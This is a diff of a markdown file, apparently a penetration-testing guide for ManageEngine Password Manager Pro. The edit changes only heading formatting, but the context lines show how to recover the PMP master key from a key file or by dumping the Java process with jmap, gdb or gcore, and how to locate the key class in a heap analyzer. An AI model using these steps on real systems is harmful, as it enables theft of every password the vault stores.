@@ -72,13 +72,13 @@ select pgp_sym_decrypt(password, <DB_ENCRYPTION_KEY>, 's2k-mode=1, cipher-algo=a
 
 If you can execute commands on the host, you can read the PMP key from a file `PMP/conf/pmp_key.key`. However, if the file is removed (according to the deploy instructions), you can try dumping it from memory
 
-*0. Get WrapperSimpleApp PID*
+**0. Get WrapperSimpleApp PID**
 
 ```bash
 jps | grep WrapperSimpleApp # Or find it yourself
 ```
 
-*1. JMAP*
+**1. JMAP**
 
 If the host have jdk installed you can simply use Jmap
 
@@ -89,7 +89,7 @@ jmap -dump:file=dump.dump <process-id>
 Then analyze the dump with any java heap analyzer tool. For example - [Eclipse Memory Analyzer](https://www.eclipse.org/mat/).  
 Load the dump into analyzer (`File -> load heap dump`) and follow `java.net.URLClassLoader -> list objects -> with outgoing references -> classes -> elementData -> <Find the one with class com.adventnet.passtrix.ed.PMPEncryptDecryptImpl> -> pmp32BitKey`
 
-*2. GDB*
+**2. GDB**
 
 **Requires root privileges**
 
@@ -97,7 +97,7 @@ Load the dump into analyzer (`File -> load heap dump`) and follow `java.net.URLC
 gdb --batch --pid <process-id> -ex "dump memory mem.dump 0xf5580000 0x100000000" && grep -a -m2 -E "[A-Za-z0-9\+/]{43}=" mem.dump
 ```
 
-*3. GCORE*
+**3. GCORE**
 
 **Requires root privileges**  
 Works half of the time `-_0_0_-`
